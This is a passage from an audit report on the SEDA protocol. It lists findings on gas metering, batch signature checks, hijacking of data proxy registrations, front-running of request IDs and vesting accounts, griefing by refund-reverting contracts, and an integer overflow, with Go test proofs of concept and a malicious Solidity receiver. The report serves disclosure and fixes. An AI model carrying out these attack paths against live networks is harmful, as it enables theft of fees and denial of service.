Executors are underpaid.

Please note that a similar conceptual mistake exists in the [`MeterExecutorGasDivergent`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/gas_meter.go#L155) function.

### PoC

_No response_

### Mitigation

Reduce the replication factor by the number of outliers to achieve a fairer distribution:

```golang
func MeterExecutorGasUniform(executors []string, gasReport uint64, outliers []bool, replicationFactor uint16, gasMeter *types.GasMeter) {
	executorGasReport := gasMeter.CorrectExecGasReportWithProxyGas(gasReport)
---	gasUsed := min(executorGasReport, gasMeter.RemainingExecGas()/uint64(replicationFactor))
+++     gasUsed := min(executorGasReport, gasMeter.RemainingExecGas()/uint64(replicationFactor - len(outliers)))
	for i, executor := range executors {
		if outliers != nil && outliers[i] {
			continue
		}
		gasMeter.ConsumeExecGasForExecutor(executor, gasUsed)
	}
}
```




# Issue M-2: Out-of-Tally-Gas Wrongly Burn Remaining Tally Gas 

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/162 

## Found by 
0xeix, 0xlookman, stuart\_the\_minion

### Summary

The `ConsumeTallyGas()` is responsible to consume tally gas and update remaining tally gas amount.

However, when the tally gas is out, the function completely clear the remaining gas, resulting in burning fewer gas in the wasm-vm and misleading gas usage of the data result.

### Root Cause

Unlike other gas consumation functions like `ConsumeExecGasForProxy()` and `ConsumeExecGasForExecutor()`, the [`ConsumeTallyGas()`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/types/gas_meter.go#L92-L99) does not reset `tallyGasRemaining` when the `gasMeter` encounters OOG.

```go
func (g *GasMeter) ConsumeTallyGas(amount uint64) bool {
	if amount > g.tallyGasRemaining {
		return true
	}

	g.tallyGasRemaining -= amount
	return false
}
```

Therefore, if the gas amount to consume is greater than the `tallyGasRemaining`, the `tallyGasRemaining` remain unchanged.

### Internal pre-conditions

*None*

### External pre-conditions

*None*

### Attack Path

*None*

### Impact

- Wasm-vm will be unable to burn the remaining tally gas.

`DistributionsFromGasMeter()` calculates the remaining tally of gas to be burned; therefore, an incomplete reset may result in a lower burn amount.

```go
func (k Keeper) DistributionsFromGasMeter(ctx sdk.Context, reqID string, reqHeight uint64, gasMeter *types.GasMeter, burnRatio math.LegacyDec) []types.Distribution {
	... 
	burn := types.NewBurn(math.NewIntFromUint64(gasMeter.TallyGasUsed()), gasMeter.GasPrice())
    ...
}

func (g GasMeter) TallyGasUsed() uint64 {
	return g.tallyGasLimit - g.tallyGasRemaining // @audit tallyGasRemaining is non-zero for OOG
}
```

- The result of data requests can mislead users

`ProcessTallies()` records the request result with error and gas usage for consumption. As the gas usage is under-evaluated, users may think that the given `tallyGasLimit` is not enough for the request.

### PoC

The following test case shows that out-of-tally-gas doesn't clear remaining gas completely.

```go
func TestFilter_OutOfTallyGas(t *testing.T) {
	f := initFixture(t)

	defaultParams := types.DefaultParams()
	err := f.tallyKeeper.SetParams(f.Context(), defaultParams)
	require.NoError(t, err)

	tallyGasLimit := defaultParams.GasCostBase + defaultParams.FilterGasCostMultiplierStdDev*6 - 100 // @audit insufficient gas

	tt := struct {
		tallyInputAsHex string
		outliers        []bool
		reveals         []types.RevealBody
	}{
		tallyInputAsHex: "0200000000000F9C1806000000000000000D242E726573756C742E74657874", // sigma_multiplier = 1.023, number_type = 0x06, json_path = $.result.text
		outliers:        []bool{false, false, true, false, true, false},
		reveals: []types.RevealBody{
			{Reveal: `{"result": {"text": -28930, "number": 0}}`},
			{Reveal: `{"result": {"text": -28000, "number": 10}}`},
			{Reveal: `{"result": {"text": -29005, "number": 101}}`},
			{Reveal: `{"result": {"text": -28600, "number": 0}}`},
			{Reveal: `{"result": {"text": -27758, "number": 0}}`},
			{Reveal: `{"result": {"text": -28121, "number": 0}}`},
		}, // stddev = 517 mean = -28403 range = [-27873.11, -28930.891]
	}

	filterInput, err := hex.DecodeString(tt.tallyInputAsHex)
	require.NoError(t, err)

	// For illustration
	for i := 0; i < len(tt.reveals); i++ {
		tt.reveals[i].Reveal = base64.StdEncoding.EncodeToString([]byte(tt.reveals[i].Reveal))
	}

	// Since ApplyFilter assumes the pubkeys are sorted.
	for i := range tt.reveals {
		sort.Strings(tt.reveals[i].ProxyPubKeys)
	}

	gasMeter := types.NewGasMeter(tallyGasLimit, 0, types.DefaultMaxTallyGasLimit, math.NewIntWithDecimal(1, 18), types.DefaultGasCostBase)

	_, err = keeper.ExecuteFilter(
		tt.reveals,
		base64.StdEncoding.EncodeToString(filterInput), uint16(len(tt.reveals)),
		types.DefaultParams(),
		gasMeter,
	)

	t.Log("err", err)
	t.Log("Remaining Tally Gas", gasMeter.RemainingTallyGas())
}
```

Output Logs:
```sh
=== RUN   TestFilter_OutOfTallyGas
    filter_test.go:897: err out of tally gas: invalid filter input [/home/stuart/go/pkg/mod/cosmossdk.io/errors@v1.0.1/errors.go:151]
    filter_test.go:898: Remaining Tally Gas 599900
--- PASS: TestFilter_OutOfTallyGas (0.32s)
PASS
ok      github.com/sedaprotocol/seda-chain/x/tally/keeper       1.670s
```

### Mitigation

My suggestion is:

```diff
func (g *GasMeter) ConsumeTallyGas(amount uint64) bool {
	if amount > g.tallyGasRemaining {
+	    g.tallyGasRemaining = 0
		return true
	}

	g.tallyGasRemaining -= amount
	return false
}
```


# Issue M-3: Signatures for the first batch will be rejected by VerifyVoteExtensionHandler 

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/188 

## Found by 
dod4ufn, zxriptor

### Summary

An incorrect check for the first batch number will result in all vote extensions with batch signatures being rejected.

### Root Cause

In the [`VerifyVoteExtensionHandler`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/app/abci/handlers.go#L159-L163), a signature is verified to ensure it was properly signed by an active validator:

```golang
	err = h.verifyBatchSignatures(ctx, batch.BatchNumber, batch.BatchId, req.VoteExtension, req.ValidatorAddress)
	if err != nil {
		h.logger.Error("failed to verify batch signature", "req", req, "err", err)
		return nil, err
	}
```

To ensure the batch was signed with the correct key used by the validator at the time of signing, the public key record is retrieved from the validator tree entry of the [previous batch](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/app/abci/handlers.go#L370-L380):

```golang
	valEntry, err := h.batchingKeeper.GetValidatorTreeEntry(ctx, batchNum-1, valOper)
	if err != nil {
		if errors.Is(err, collections.ErrNotFound) {
			if len(voteExtension) == 0 {
				return nil
			}
			return ErrUnexpectedBatchSignature
		}
		return err
	}
	expectedAddr = valEntry.EthAddress
```

There is an inherent cold start issue: when the very first batch is signed, there is no previous record to verify the validator's key. In this case, the code defaults to [using the current key](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/app/abci/handlers.go#L360-L369) as stored in the `x/pubkey` module:

```golang
	if batchNum == collections.DefaultSequenceStart {
		pubKey, err := h.pubKeyKeeper.GetValidatorKeyAtIndex(ctx, valOper, utils.SEDAKeyIndexSecp256k1)
		if err != nil {
			return err
		}
		expectedAddr, err = utils.PubKeyToEthAddress(pubKey)
		if err != nil {
			return err
		}
	} else {
               // ... skipped for brevity ...
        }
```

However, the condition used to check whether it is the first batch is incorrect. The numbering [starts](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/batching/keeper/endblock.go#L69-L72) from `collections.DefaultSequenceStart + 1` and only increments, meaning the condition `batchNum == collections.DefaultSequenceStart` will never be satisfied:

```golang
	if !errors.Is(err, types.ErrBatchingHasNotStarted) {
		return types.Batch{}, types.DataResultTreeEntries{}, nil, err
	}
	newBatchNum = collections.DefaultSequenceStart + 1
```

This causes the code to follow the default branch, where the validator key is not found, leading to the extension vote being rejected.

### Internal Pre-conditions

Happens for the first batch only.

### External Pre-conditions

None

### Attack Path

See the explanation in the Root Cause section 

### Impact

Inability to sign the first batch.

### PoC

_No response_

### Mitigation

The check for the first batch must be `if batchNum == collections.DefaultSequenceStart + 1`

# Issue M-4: Malicious user can hijack data proxy registrations through signature reuse 

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/194 

## Found by 
000000, Boy2000, DeLaSoul, tallo, zxriptor

### Summary

Legitimate users wishing to register a data proxy will register their proxy through the MsgRegisterDataProxy message which is handled by the RegisterDataProxy function. This function has defect in that it allows un
a critical defect in signature validation will cause unauthorized data proxy admin access for all new proxy registrations as an attacker will intercept legitimate data proxy registration transactions and replace the admin address while reusing the original signature.


### Root Cause

In the data proxy models `msg_server.go`, the signature validation logic only includes fee, payout address, memo and chain ID in the payload, but omits the admin address:
https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/data-proxy/keeper/msg_server.go#L33

```go
	payload := make([]byte, 0, len(feeBytes)+len(payoutAddressBytes)+len(memoBytes))
	payload = append(payload, feeBytes...)
	payload = append(payload, payoutAddressBytes...)
	payload = append(payload, memoBytes...)
	payload = append(payload, []byte(ctx.ChainID())...)
```
This is a error, because the admin address has full control over the data proxy and is not part of the signed payload. This allows anybody to substitute their own admin address while using another entity's valid signature.

### Internal Pre-conditions

1. A legitimate data proxy owner creates a valid signature with their fee, payout address, memo and chain ID
2. The legitimate owner prepares a transaction to register their data proxy with this signature
3. The network's mempool contains the pending transaction with the valid signature which is viewable by a malicious user

### External Pre-conditions

None

### Attack Path

1. Attacker observes a valid data proxy registration transaction in the mempool
2. Attacker copies all the transaction parameters, including the valid signature
3. Attacker creates a new transaction replacing only the admin address with their own address
4. Attacker submits this modified transaction with a higher gas price to front-run the legitimate transaction
5. Attacker's transaction is processed first and succeeds validation since signature verification doesn't check the admin address
6. The original legitimate transaction fails because the public key is already registered
7. Attacker now has admin privileges over the data proxy and can:
- Change the payout address to steal fees
- Modify the fee amount
- Transfer admin privileges to a different address

### Impact

The legitimate data proxy owner loses complete control of their service. The attacker gains unauthorized administrator access and can redirect all payment streams from the data proxy. This effectively steals the revenue stream from legitimate data proxy operators and compromises the integrity of the entire data proxy system. 


### Mitigation

Include the admin address in the signature payload

# Issue M-5: requestId has no unique parameters leading to different collisions 

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/212 

## Found by 
0xeix, Boy2000, blutorque, leopoldflint, rsam\_eth, zxriptor

### Summary

The requestId parameter that's derived when posting a request is not unique and therefore can't be replicated again if needed or can be blocked by other users with front-running.

### Root Cause

Currently, the requestId that's obtained by calling `deriveRequestId()` cannot be sent again with the same parameters if needed (for instance, when dealing with data price feeds) and can be blocked as well leading to undesired behavior for the entity that tries to post it.

### Internal Pre-conditions

-

### External Pre-conditions

An entity posts a data request on one of the supported chains.

### Attack Path

1) There can be a situation where the same data request with exactly the same input parameters is needed to be sent (when dealing with price feeds for example) but it can't be done as the one of the parameters is needed to be adjusted each time

2) Users who are interested in blocking a data request can infinetely front-run the transactions and block the data request posting (this could lead to a situation where some users benefit from the stale prices used in some other protocol that can't fetch the data)

### Impact

Data request collisions open up many attack surfaces including the situation where protocols can't fetch the data if an attacker decides to front-run them each time and blocking the requests (if there is a data request with the same id, the tx will revert)

### PoC

Consider the current requestId derivation process:

https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-evm-contracts/contracts/libraries/SedaDataTypes.sol#L122-139
```sollidity

   function deriveRequestId(RequestInputs memory inputs) internal pure returns (bytes32) {
        return
            keccak256(
                bytes.concat(
                    keccak256(bytes(SedaDataTypes.VERSION)),
                    inputs.execProgramId,
                    keccak256(inputs.execInputs),
                    bytes8(inputs.execGasLimit),
                    inputs.tallyProgramId,
                    keccak256(inputs.tallyInputs),
                    bytes8(inputs.tallyGasLimit),
                    bytes2(inputs.replicationFactor),
                    keccak256(inputs.consensusFilter),
                    bytes16(inputs.gasPrice),
                    keccak256(inputs.memo)
                )
            );
    }

```

So the requestId depends on each of this parameters. And if the same one already exists, the new request with the same params will be blocked:

https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-evm-contracts/contracts/core/abstract/RequestHandlerBase.sol#L42-44
```solidity

     if (bytes(_requestHandlerStorage().requests[requestId].version).length != 0) {
            revert RequestAlreadyExists(requestId);
        }

```


First of all, there is no any nonce parameter in the requestId meaning the entity that posts a request has to always change them to make a new hash which damages user experience. The most serious impact though is an ability of malicious users to front-run the requests and always create a request with the same values as there is no `msg.sender` involved here. This leads to a situation where blockchains or users can't even post a request and this can be essential to the protocol if it depends on the external oracles and the data can't be fetched in time leading to stale state.

### Mitigation

Introduce some unique parameters like nonce and `msg.sender` address.

# Issue M-6: Attackers can flood solvers with thousands of requests and prevent fee payouts 

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/217 

## Found by 
000000, 0xMgwan, 0xlookman, Boy2000, Kodyvim, PNS, blutorque, g, gegul, leopoldflint, rsam\_eth, zxriptor

### Summary
The current fee distribution model compensates solvers only after the result is posted on-chain—a fee system known as the push model. In this design, solver must call the `postResult` function to trigger fee payments. However, this mechanism can be exploited. An attacker can deploy tens of smart contracts that appear to submit attractive requests with generous fees, but are engineered to revert on native token transfers upon receiving the refund amounts. 
```solidity
        // Example: Attacker switches the `revertOnReceiveEther` in their contract to true, to prevent a result from getting posted
        if (refundAmount > 0) {
            _transferFee(requestDetails.requestor, refundAmount);
            emit FeeDistributed(result.drId, requestDetails.requestor, refundAmount, ISedaCore.FeeType.REFUND);
        }
```
(these contracts may even include an on/off switch that bypasses solvers’ checks for whether the requester can receive Ether). As a result, the network is forced to process these requests. Then, just before the results are posted, the attacker can disable Ether acceptance, thereby preventing fee transfers. Once the timeout period expires, the attacker can withdraw funds from all the requests using `withdrawTimedOutRequest`. In effect, the attacker incurs only minimal gas fees (especially on L2s) while overloading solvers and the Seda chain with tasks.

### Root Cause
After a request is posted, its fees remain in the contract until results are posted using the `postResult` function. The fee distribution occurs only after solvers submit the results and the contract verifies that the `result ID` is included in the batch’s `resultsRoot`.

For the malicious requester to trigger a revert during the native token transfer (thus blocking fee distribution), the `refundAmount` must be greater than zero. This can be achieved by setting the `request.gasLimit` slightly higher than the actual gas used, When the fee is calculated:
https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-evm-contracts/contracts/core/SedaCoreV1.sol#L162
```solidity
                // Split request fee proportionally based on gas used vs gas limit
                //@audit if gasLimit > gasUsed, then submitterFee < requestDetails.requestFee
                uint256 submitterFee = (result.gasUsed * requestDetails.requestFee) / requestDetails.gasLimit;
                if (submitterFee > 0) {
                    _transferFee(payableAddress, submitterFee);
                    emit FeeDistributed(result.drId, payableAddress, submitterFee, ISedaCore.FeeType.REQUEST);
                }
                //@audit remaining amount to refund
                refundAmount += requestDetails.requestFee - submitterFee;
```
Later, when transferring the refund to the requester:
```solidity
        // Aggregate refund to requestor containing:
        // - unused request fees (when gas used < gas limit)
        // - full request fee (when invalid payback address)
        // - batch fee (when no batch sender)
        if (refundAmount > 0) {
            _transferFee(requestDetails.requestor, refundAmount);
            emit FeeDistributed(result.drId, requestDetails.requestor, refundAmount, ISedaCore.FeeType.REFUND);
        }
```
If the requester is a contract that reverts on receiving native tokens, the transfer will fail. For instance:
```solidity
contract Malicious {
    //...rest of the code
    bool acceptEther;
    receive() external payable {
        if (!acceptEther) revert();
    }
    //...rest of the code
}
```
Finally, after the timeout period (`_storageV1().timeoutPeriod`), the attacker can withdraw the funds from all requests by calling `withdrawTimedOutRequest`.

### Internal Pre-conditions
- Contract not be in `paused` state

### External Pre-conditions
- Solvers are actively picking up requests with sufficiently attractive fees.
- Solvers are posting results back to `SedaCoreV1` using the `postResult` function.
- The requester is a contract engineered to reject native token transfers (with an on/off switch for Ether reception), allowing later withdrawal of funds.

### Attack Path
- The attacker deploys 100 different smart contracts with identical behavior (including an on/off feature for receiving Ether) on Optimism.
- Each malicious contract submits 100 requests with sufficiently high fees to attract solvers.
- Solvers pick up these requests one by one and relay them to the Seda chain.
- The requests are processed on the Seda network.
- The results are batched and posted on-chain.
- When a solver attempts to post the results to claim the fees, the attacker disables Ether reception in the malicious contracts.
- As a result, fee transfers to solvers revert.
- Solvers become congested with 100 × 100 = 10,000 processed requests that yield no fee payouts, overloading the system.

### Impact
- **Uncompensated Solvers and SEDA Chain:**  
  The attack causes solvers to perform all necessary computations and batch processing without receiving any compensation.
  
- **Potential Network Instability:**  
  Over time, the inability to compensate solvers may lead to decline in the overall performance (since attacker can perform major request attacks each time from ananymous contracts) and trust in the blockchain ecosystem.

### PoC
n/a

### Mitigation
Instead of using a push model for fee distribution, a pull model should be adopted. In a pull model, all parties are credited with the appropriate amounts of native tokens within the contract. They can then withdraw these funds at their discretion.

# Issue M-7: Vesting transactions can not be processed because Vesting's MsgServer is not registered 

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/237 

## Found by 
g

### Summary

The Vesting module's `RegisterServices()` function is outdated and does not match the expected interface. It does not get run so its `MsgServer` does not get registered.

### Root Cause

- Vesting module's [`RegisterServices()`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/vesting/module.go#L102-L106) expects a `grpc.ServiceRegistrar` parameter. This is an outdated version
of `RegisterServices()`, which no longer matches the expected interface in Cosmos-SDK v0.50+. The expected [interface](https://github.com/cosmos/cosmos-sdk/blob/v0.50.11/types/module/module.go#L214-L217) is the following:

```golang
type HasServices interface {
	// RegisterServices allows a module to register services.
	RegisterServices(Configurator) // ======> Note that it expects a Configurator type
}
```

The `Configurator` interface does not match the `ServiceRegistrar` interface.

### Internal Pre-conditions
None


### External Pre-conditions
None


### Attack Path

1. When the SEDA Chain starts, it calls [`RegisterServices()`](https://github.com/cosmos/cosmos-sdk/blob/v0.50.11/types/module/module.go#L463-L468).
2. `RegisterServices()` checks if the module satisfies the `HasServices` interface. This check fails for the Vesting module, so its `RegisterServices()` does not get called.
```golang
  if module, ok := module.(appmodule.HasServices); ok {
    err := module.RegisterServices(cfg)
    if err != nil {
      return err
    }
  }
```

### Impact

All Vesting transactions can not be processed because its `MsgServer` is not registered.


### PoC
None


### Mitigation
Consider updating the `RegisterServices()` to match the expected interface.

# Issue M-8: Anyone can front-run the creation of a vesting account to block it 

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/251 

## Found by 
000000, g

### Summary

Creation of a vesting account will not work when the recipient of the vested funds [already exists](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/vesting/keeper/msg_server.go#L56-L58). Anyone can then block a new vesting account from being created by front-running it with a [`Bank::Msg.Send`](https://github.com/cosmos/cosmos-sdk/blob/v0.50.11/x/bank/keeper/msg_server.go#L29-L83).

### Root Cause

A vesting account can only be created if the recipient [does not exist](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/vesting/keeper/msg_server.go#L56-L58) yet.

```golang
if acc := m.ak.GetAccount(ctx, to); acc != nil {
  return nil, sdkerrors.ErrInvalidRequest.Wrapf("account %s already exists", msg.ToAddress)
}
```

This can be exploited by anyone that [sends coins](https://github.com/cosmos/cosmos-sdk/blob/v0.50.11/x/bank/keeper/send.go#L226-L234) to the intended vesting recipient.

```golang
func (k BaseSendKeeper) SendCoins(ctx context.Context, fromAddr, toAddr sdk.AccAddress, amt sdk.Coins) error {
  // ... snip ... 
 
	// Create account if recipient does not exist.
	//
	// NOTE: This should ultimately be removed in favor a more flexible approach
	// such as delegated fee messages.
	accExists := k.ak.HasAccount(ctx, toAddr)
	if !accExists {
		defer telemetry.IncrCounter(1, "new", "account")
		k.ak.SetAccount(ctx, k.ak.NewAccountWithAddress(ctx, toAddr))
	}
```

### Internal Pre-conditions
None


### External Pre-conditions
None


### Attack Path
1. A user calls `CreateVestingAccount()` with `pubkeyB` as the intended recipient.
2. The griefer frontruns the `CreateVestingAccount()` transaction with Bank [`Send()`](https://github.com/cosmos/cosmos-sdk/blob/v0.50.11/x/bank/keeper/msg_server.go#L29-L83) transaction.
This transaction creates the recipient account causing the `CreateVestingAccount()` to fail.


### Impact

The intended recipient of the vesting funds is permanently blocked from becoming a Vesting Account. Once an account is created, it can not be deleted. 


### PoC
None


### Mitigation
Consider updating an existing account to a Vesting Account.

# Issue M-9: Executors/Proxies can game the rewards system by using a pubkey that will be sorted first 

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/257 

## Found by 
g, zxriptor

### Summary

The reveals and proxy pubkeys are sorted in ascending order every time data requests are filtered and tallied. The same ordering is used when metering gas for Proxies and Executors. Proxies and Executors that are sorted first will be prioritized for rewards distribution.

### Root Cause

In [`FilterAndTally():185-197`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/endblock.go#L185-L197), the `reveals` are sorted in ascending order by their executor's key while the `ProxyPubkeys` of each reveal are also sorted in ascending order.

```golang
  keys := make([]string, len(req.Reveals))
  i := 0
  for k := range req.Reveals {
    keys[i] = k
    i++
  }
  sort.Strings(keys)

  reveals := make([]types.RevealBody, len(req.Reveals))
  for i, k := range keys {
    reveals[i] = req.Reveals[k]
    sort.Strings(reveals[i].ProxyPubKeys)
  }
```

When [metering](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/gas_meter.go#L68-L97) gas for proxies, the proxies are allocated gas in the same order until there is no remaining execution gas. Proxies with pubkeys that are ordered first will be prioritized.

The same behavior applies when [metering](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/gas_meter.go#L135-L144) gas for executors.

### Internal Pre-conditions
None


### External Pre-conditions
None


### Attack Path

1. A Proxy/Executor will generate and use public keys that will be ordered first when sorted.
2. When gas rewards are allocated and distributed, they will always be prioritized over others.


### Impact

The rewards system can be gamed so that certain Executors/Proxies will always be prioritized for rewards even when all participating proxies/executors provide the same value.


### PoC
None


### Mitigation
Consider randomizing the order of the executors' and proxies' public keys when allocating their rewards.

# Issue M-10: Gas Metering Integer Overflow in Tally Module 

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/264 

## Found by 
verbotenviking

### Summary

The gas metering implementation in the tally module contains multiple arithmetic vulnerabilities that allow attackers to manipulate payment distributions by submitting maliciously crafted gas reports.

### Root Cause

In [gas_meter.go](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/gas_meter.go#L162-L163), the `MeterExecutorGasDivergent` function performs raw uint64 arithmetic operations without overflow protection when calculating gas distributions:

```go
// x/tally/keeper/gas_meter.go (lines ~162-163)
totalGasUsed := math.NewIntFromUint64(medianGasUsed*uint64(replicationFactor-1) + min(lowestReport*2, medianGasUsed))
totalShares := math.NewIntFromUint64(medianGasUsed * uint64(replicationFactor-1)).Add(math.NewIntFromUint64(lowestReport * 2))
```

These operations can overflow when handling extremely large gas reports, resulting in distorted distributions.


### Internal Pre-conditions

1. A data request is made with multiple executors
2. At least one malicious executor submits an extremely large gas report (close to uint64.MaxValue)
3. The gas metering logic uses the divergent path (non-uniform reports)

### External Pre-conditions

None

### Attack Path

1. Attacker runs a SEDA executor node
2. Attacker submits data request results with an extremely large gas usage report (close to uint64.MaxValue)
3. During gas distribution in `MeterExecutorGasDivergent`, the large value causes overflow when multiplied:
-  `medianGasUsed*uint64(replicationFactor-1)` overflows
- `lowestReport*2` potentially overflows
5. Overflowed values are passed to `math.NewIntFromUint64()`, creating incorrect distribution calculations
6. The final gas allocations are distorted, giving unequal payouts to executors with identical gas reports

### Impact

The protocol suffers from unfair token distribution where honest executors receive less compensation than they should, while malicious executors can potentially receive disproportionate rewards. This breaks the economic security of the system and undermines the incentive mechanism for honest reporting.



### PoC

Create a new file: `x/tally/keeper/overflow_test.go`

```go
package keeper_test

import (
	"testing"

	"cosmossdk.io/math"

	"github.com/sedaprotocol/seda-chain/x/tally/keeper"
	"github.com/sedaprotocol/seda-chain/x/tally/types"
)

// TestGasMeteringOverflow demonstrates the vulnerability in gas metering calculations
// This test shows how providing extremely large gas reports can cause anomalous distributions
func TestGasMeteringOverflow(t *testing.T) {
	// Setup test values
	executors := []string{"executor1", "executor2", "executor3"}

	// Create a test case with two normal gas reports and one extremely high one
	normalGasReport := uint64(1000000)
	// Maximum uint64 value (2^64-1)
	maxUint64Value := ^uint64(0)
	overflowValue := maxUint64Value - 100 // Very close to overflow

	t.Logf("Normal gas report: %d", normalGasReport)
	t.Logf("Overflow value: %d", overflowValue)
	t.Logf("Max uint64 value: %d", maxUint64Value)

	// EXPLOIT EXPLANATION
	t.Logf("\n--- EXPLOIT EXPLANATION ---")
	t.Logf("The vulnerability occurs when an attacker submits an extremely large gas report")
	t.Logf("When performing uint64 multiplication with large numbers, overflow will occur")
	t.Logf("For example: %d * 2 = %d (which overflows and becomes %d)",
		overflowValue, overflowValue*2, overflowValue*2)
	t.Logf("This overflow causes incorrect gas calculations leading to unfair token distributions")
	t.Logf("------------------------\n")

	gasReports := []uint64{normalGasReport, normalGasReport, overflowValue}

	// No outliers for this test
	outliers := []bool{false, false, false}

	// Standard replication factor
	replicationFactor := uint16(3)

	// Setup a gas meter with reasonable limits using the existing package
	gasMeter := types.NewGasMeter(
		1e13, // Tally gas limit
		1e13, // Execution gas limit
		types.DefaultMaxTallyGasLimit,
		math.NewIntWithDecimal(1, 18), // Gas price: 1 token
		types.DefaultGasCostBase,
	)

	// Record initial state
	initialExecGas := gasMeter.RemainingExecGas()

	t.Logf("Initial exec gas: %d", initialExecGas)
	t.Logf("Testing with gasReports: %v", gasReports)

	// Calculate and log potential vulnerable operations before executing
	medianIndex := len(gasReports) / 2
	medianGasUsed := gasReports[medianIndex]
	lowestReport := gasReports[0]
	for _, report := range gasReports[1:] {
		if report < lowestReport {
			lowestReport = report
		}
	}

	t.Logf("\n--- VULNERABLE CALCULATIONS ---")
	t.Logf("Median gas used: %d", medianGasUsed)
	t.Logf("Lowest report: %d", lowestReport)

	// Demonstrate the specific calculations that will overflow
	t.Logf("Vulnerable calculation 1: medianGasUsed*uint64(replicationFactor-1) = %d*%d",
		medianGasUsed, uint64(replicationFactor-1))

	var calcResult uint64
	if medianGasUsed == overflowValue {
		t.Logf("This would overflow! Max uint64: %d", maxUint64Value)
		t.Logf("Actual result after overflow: %d", overflowValue*uint64(replicationFactor-1))
		calcResult = overflowValue * uint64(replicationFactor-1)
	} else {
		calcResult = medianGasUsed * uint64(replicationFactor-1)
		t.Logf("Result: %d", calcResult)
	}

	t.Logf("Vulnerable calculation 2: lowestReport*2 = %d*2", lowestReport)
	if lowestReport > maxUint64Value/2 {
		t.Logf("This would overflow! Max uint64: %d", maxUint64Value)
		t.Logf("Actual result after overflow: %d", lowestReport*2)
	} else {
		t.Logf("Result: %d", lowestReport*2)
	}

	t.Logf("Vulnerable calculation 3: totalGasUsed := medianGasUsed*uint64(replicationFactor-1) + min(lowestReport*2, medianGasUsed)")
	t.Logf("If any of these operations overflow, the total gas calculation becomes incorrect")
	t.Logf("When converted to tokens this leads to incorrect payments")
	t.Logf("------------------------\n")

	// Call the vulnerable function directly
	keeper.MeterExecutorGasDivergent(executors, gasReports, outliers, replicationFactor, gasMeter)

	// Check state after execution
	finalExecGas := gasMeter.RemainingExecGas()

	// Verify gas consumption and distribution
	gasConsumed := initialExecGas - finalExecGas
	t.Logf("Final exec gas: %d", finalExecGas)
	t.Logf("Gas consumed: %d", gasConsumed)

	// Display executor payouts to check for anomalies
	t.Logf("\n--- ATTACK RESULTS ---")
	t.Logf("Executor payouts:")
	for i, executor := range gasMeter.Executors {
		t.Logf("  Executor %s: %s (reported: %d)",
			executors[i], executor.Amount.String(), gasReports[i])
	}

	// Check for expected behavior with normal values for comparison
	controlGasMeter := types.NewGasMeter(
		1e13, // Tally gas limit
		1e13, // Execution gas limit
		types.DefaultMaxTallyGasLimit,
		math.NewIntWithDecimal(1, 18), // Gas price: 1 token
		types.DefaultGasCostBase,
	)

	controlReports := []uint64{normalGasReport, normalGasReport, normalGasReport}
	keeper.MeterExecutorGasDivergent(executors, controlReports, outliers, replicationFactor, controlGasMeter)

	t.Logf("\n--- EXPECTED BEHAVIOR (CONTROL) ---")
	t.Logf("Control gas meter executor payouts:")
	for i, executor := range controlGasMeter.Executors {
		t.Logf("  Executor %s: %s (reported: %d)",
			executors[i], executor.Amount.String(), controlReports[i])
	}

	// Special checks to detect overflow effects
	anomaliesFound := false

	t.Logf("\n--- ANOMALIES DETECTION ---")
	// Check for overflowed values in executor payouts
	for i, executor := range gasMeter.Executors {
		// Check for suspiciously small or large values
		if executor.Amount.IsZero() {
			t.Logf("ANOMALY: Executor %s has zero payout despite reporting %d gas",
				executors[i], gasReports[i])
			anomaliesFound = true
		}

		// If this is one of the executors with normal gas reports
		if gasReports[i] == normalGasReport && i < 2 {
			// In case of overflow, the distribution would likely be very different from expected
			if executor.Amount.GT(math.NewIntFromUint64(normalGasReport).MulRaw(100)) {
				t.Logf("ANOMALY: Executor %s has suspiciously large payout: %s for %d reported gas",
					executors[i], executor.Amount.String(), gasReports[i])
				anomaliesFound = true
			}
		}
	}

	// Check if the executors with identical gas reports got different payouts
	if gasReports[0] == gasReports[1] &&
		gasMeter.Executors[0].Amount.String() != gasMeter.Executors[1].Amount.String() {
		t.Logf("VULNERABILITY DETECTED: Gas distribution anomaly - Identical gas reports resulted in different payouts")
		t.Logf("  Executor 0 payout: %s", gasMeter.Executors[0].Amount.String())
		t.Logf("  Executor 1 payout: %s", gasMeter.Executors[1].Amount.String())
		anomaliesFound = true
	}

	if anomaliesFound {
		t.Logf("VULNERABILITY CONFIRMED: The gas distribution shows anomalies due to integer overflow")
	} else {
		t.Logf("No gas distribution anomalies detected")
	}

	// Document the specific vulnerability in the code with more details
	t.Logf("\n--- VULNERABILITY DETAILS ---")
	t.Logf("Vulnerability is in MeterExecutorGasDivergent function:")
	t.Logf("1. Line ~161: totalGasUsed := math.NewIntFromUint64(medianGasUsed*uint64(replicationFactor-1) + min(lowestReport*2, medianGasUsed))")
